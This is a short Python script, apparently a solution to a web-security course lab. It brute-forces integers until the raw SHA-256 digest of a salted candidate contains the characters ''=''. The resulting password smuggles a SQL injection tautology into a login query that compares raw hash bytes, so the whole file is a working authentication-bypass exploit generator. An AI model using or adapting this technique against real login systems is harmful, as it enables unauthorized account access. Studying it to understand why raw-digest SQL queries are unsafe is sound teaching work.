import sys
import random
import string 
from hashlib import sha256
import re

#generate a string of our int
def generateCandidate(i):
    candidate = str(i)
    return candidate

#mimic hashing within server
def hashing(candidate):
    password_bytes = ("bungle-" + candidate).encode("latin-1")
    password_digest = sha256(password_bytes).digest().decode("latin-1")
    return password_digest

def main():
    candidateFound = False
    i = 0

    # search for potential candidate
    while(candidateFound != True):
        candidate = generateCandidate(i)

        digest = hashing(candidate)
        
        #check for sql injection substring within digest
        match = re.search(r"'='", digest)
        if match:
            print(candidate)
            return candidate
        else:
            i+=1
            
        
if __name__ == '__main__':
    main()

